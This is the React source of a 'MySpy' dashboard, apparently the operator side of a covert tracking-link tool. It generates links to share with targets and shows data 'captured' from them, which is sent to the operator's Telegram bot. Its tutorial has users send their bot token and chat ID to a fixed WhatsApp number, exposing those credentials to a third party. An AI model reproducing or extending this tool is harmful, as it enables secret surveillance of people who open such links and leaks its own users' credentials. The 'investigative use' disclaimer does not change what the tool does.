"use client"

import { useState, useEffect } from "react"
import { motion } from "framer-motion"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { ExternalLink, Info, MessageSquare, Bot, Send, Camera, MapPin, Link as LinkIcon } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { CaptureDataDisplay } from "@/components/CaptureDataDisplay"
import { CaptureData } from "@/services/telegram"

export default function Dashboard() {
  const [mounted, setMounted] = useState(false)
  const [botToken, setBotToken] = useState("")
  const [chatId, setChatId] = useState("")
  const [captures, setCaptures] = useState<CaptureData[]>([])
  const [generatedLink, setGeneratedLink] = useState<string>("")

  useEffect(() => {
    setMounted(true)
    // Load saved captures from localStorage
    const savedCaptures = localStorage.getItem('captures')
    if (savedCaptures) {
      setCaptures(JSON.parse(savedCaptures))
    }
  }, [])

  const openWhatsApp = () => {
    const text = `Hello! I've configured my Telegram bot.\n\nToken: ${botToken}\nChat ID: ${chatId}`
    window.open(`https://wa.me/88994853377?text=${encodeURIComponent(text)}`, "_blank")
  }

  const generateLink = async () => {
    try {
      const response = await fetch('/api/links', {
        method: 'POST'
      })
      const data = await response.json()
      if (data.success) {
        setGeneratedLink(`${window.location.origin}${data.link}`)
      }
    } catch (error) {
      console.error('Error generating link:', error)
    }
  }

  if (!mounted) return null

  return (
    <div className="relative min-h-screen">
      <div className="relative z-10">
        <main className="container mx-auto px-4 py-8">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
            <div className="flex justify-between items-center mb-6">
              <h1 className="text-3xl font-bold glow-text">MySpy Dashboard</h1>
              <Button onClick={generateLink} className="bg-blue-600 hover:bg-blue-700">
                <LinkIcon className="mr-2 h-4 w-4" />
                Generate Link
              </Button>
            </div>

            {generatedLink && (
              <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800 mb-6">
                <CardContent className="pt-6">
                  <div className="flex items-center gap-2">
                    <LinkIcon className="h-5 w-5 text-blue-400" />
                    <a
                      href={generatedLink}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-blue-400 hover:text-blue-300 break-all"
                    >
                      {generatedLink}
                    </a>
                  </div>
                </CardContent>
              </Card>
            )}

            <Tabs defaultValue="captures" className="w-full">
              <TabsList className="mb-6">
                <TabsTrigger value="captures">Captures</TabsTrigger>
                <TabsTrigger value="tutorial">Tutorial</TabsTrigger>
                <TabsTrigger value="howto">How to Use</TabsTrigger>
              </TabsList>

              <TabsContent value="captures" className="space-y-6">
                {captures.length > 0 ? (
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    {captures.map((capture, index) => (
                      <CaptureDataDisplay key={index} data={capture} />
                    ))}
                  </div>
                ) : (
                  <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
                    <CardHeader>
                      <CardTitle className="text-xl gradient-text">No Captures Yet</CardTitle>
                      <CardDescription>Captured data will appear here</CardDescription>
                    </CardHeader>
                  </Card>
                )}
              </TabsContent>

              <TabsContent value="tutorial" className="space-y-6">
                <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
                  <CardHeader>
                    <CardTitle className="text-xl gradient-text">Tutorial: Telegram Bot Configuration</CardTitle>
                    <CardDescription>Follow the steps below to set up your Telegram bot</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-6">
                      <div className="rounded-lg overflow-hidden border border-gray-700">
                        <div className="bg-gray-800 p-3 flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <Bot className="h-5 w-5 text-red-400" />
                            <span className="font-medium">Step 1: Create a Telegram Bot</span>
                          </div>
                          <div className="text-xs bg-red-500/20 px-2 py-1 rounded text-red-300">Required</div>
                        </div>
                        <div className="p-4 bg-gray-900/70">
                          <ol className="list-decimal list-inside space-y-4 text-gray-300">
                            <li>
                              Open Telegram and search for{" "}
                              <span className="bg-gray-800 px-2 py-1 rounded font-mono">@BotFather</span>
                            </li>
                            <li>
                              Start a conversation with BotFather and send the command{" "}
                              <span className="bg-gray-800 px-2 py-1 rounded font-mono">/newbot</span>
                            </li>
                            <li>Follow the instructions to name your bot</li>
                            <li>
                              When finished, you'll receive a <span className="text-red-400 font-semibold">token</span>.
                              Save this token!
                            </li>
                          </ol>

                          <div className="mt-4">
                            <a
                              href="https://www.youtube.com/shorts/gdZeRSotbV0"
                              target="_blank"
                              rel="noopener noreferrer"
                              className="flex items-center gap-2 text-red-400 hover:text-red-300 transition-colors"
                            >
                              <ExternalLink className="h-4 w-4" />
                              <span>Watch tutorial video</span>
                            </a>
                          </div>
                        </div>
                      </div>

                      <div className="rounded-lg overflow-hidden border border-gray-700">
                        <div className="bg-gray-800 p-3 flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <MessageSquare className="h-5 w-5 text-red-400" />
                            <span className="font-medium">Step 2: Get the Chat ID</span>
                          </div>
                          <div className="text-xs bg-red-500/20 px-2 py-1 rounded text-red-300">Required</div>
                        </div>
                        <div className="p-4 bg-gray-900/70">
                          <ol className="list-decimal list-inside space-y-4 text-gray-300">
                            <li>Send a message to the bot you just created</li>
                            <li>
                              Access the URL:{" "}
                              <span className="bg-gray-800 px-2 py-1 rounded font-mono break-all">
                                https://api.telegram.org/bot&lt;YOUR_TOKEN&gt;/getUpdates
                              </span>
                            </li>
                            <li>
                              Replace{" "}
                              <span className="bg-gray-800 px-2 py-1 rounded font-mono">&lt;YOUR_TOKEN&gt;</span> with
                              the token you received
                            </li>
                            <li>
                              Look for <span className="text-red-400 font-semibold">"chat":{"{"}"id":</span> and copy
                              the number that appears
                            </li>
                          </ol>
                        </div>
                      </div>

                      <div className="rounded-lg overflow-hidden border border-gray-700">
                        <div className="bg-gray-800 p-3 flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <Send className="h-5 w-5 text-red-400" />
                            <span className="font-medium">Step 3: Send Information</span>
                          </div>
                          <div className="text-xs bg-red-500/20 px-2 py-1 rounded text-red-300">Required</div>
                        </div>
                        <div className="p-4 bg-gray-900/70">
                          <p className="text-gray-300 mb-4">
                            After obtaining the token and chat ID, fill in the fields below and send the information:
                          </p>

                          <div className="space-y-4">
                            <div>
                              <Label htmlFor="bot-token">Bot Token</Label>
                              <Input
                                id="bot-token"
                                placeholder="Example: 1234567890:ABCDefGhIJKlmNoPQRsTUVwxyZ"
                                className="bg-gray-800 border-gray-700"
                                value={botToken}
                                onChange={(e) => setBotToken(e.target.value)}
                              />
                            </div>

                            <div>
                              <Label htmlFor="chat-id">Chat ID</Label>
                              <Input
                                id="chat-id"
                                placeholder="Example: 123456789"
                                className="bg-gray-800 border-gray-700"
                                value={chatId}
                                onChange={(e) => setChatId(e.target.value)}
                              />
                            </div>

                            <Button onClick={openWhatsApp} className="w-full bg-green-600 hover:bg-green-700">
                              <MessageSquare className="mr-2 h-4 w-4" />
                              Send to WhatsApp
                            </Button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="howto">
                <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
                  <CardHeader>
                    <CardTitle className="text-xl gradient-text">How to Use</CardTitle>
                    <CardDescription>Follow these instructions to use the MySpy platform</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      <div className="flex gap-4 items-start">
                        <div className="bg-red-500/20 rounded-full p-2 mt-1">
                          <span className="text-red-400 font-bold">1</span>
                        </div>
                        <div>
                          <p className="text-gray-200">Configure your Telegram bot following the tutorial</p>
                        </div>
                      </div>

                      <div className="flex gap-4 items-start">
                        <div className="bg-red-500/20 rounded-full p-2 mt-1">
                          <span className="text-red-400 font-bold">2</span>
                        </div>
                        <p className="text-gray-200">
                          Contact support to generate a custom link for your investigation
                        </p>
                      </div>

                      <div className="flex gap-4 items-start">
                        <div className="bg-red-500/20 rounded-full p-2 mt-1">
                          <span className="text-red-400 font-bold">3</span>
                        </div>
                        <p className="text-gray-200">Share the generated link as needed</p>
                      </div>

                      <div className="flex gap-4 items-start">
                        <div className="bg-red-500/20 rounded-full p-2 mt-1">
                          <span className="text-red-400 font-bold">4</span>
                        </div>
                        <p className="text-gray-200">Receive information directly on your Telegram bot</p>
                      </div>

                      <div className="mt-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex gap-3">
                        <Info className="h-5 w-5 text-red-400 flex-shrink-0 mt-0.5" />
                        <div>
                          <p className="text-gray-200 text-sm">
                            <span className="font-semibold text-red-400">Important:</span> This platform is exclusively
                            intended for professional and investigative use. Misuse is the sole responsibility of the
                            user.
                          </p>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </motion.div>
        </main>
      </div>
    </div>
  )
}
